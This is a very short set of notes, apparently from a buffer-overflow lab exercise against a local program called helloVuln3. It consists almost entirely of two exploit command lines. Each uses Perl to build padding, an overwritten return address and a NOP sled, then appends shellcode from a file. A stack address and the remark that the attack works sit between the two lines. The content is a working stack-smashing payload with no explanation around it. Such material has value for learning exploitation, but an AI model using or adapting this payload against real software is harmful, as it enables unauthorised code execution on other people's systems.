

./helloVuln3 $(perl -e 'print "A"x28 . "\x50\xed\xff\xbf" . "\x90"x10')$(cat shell.bin)

ffffcf40

## Works...

./helloVuln3 $(perl -e 'print "A"x28 . "\x40\xcf\xff\xff" . "\x90"x1000')$(cat shell.bin)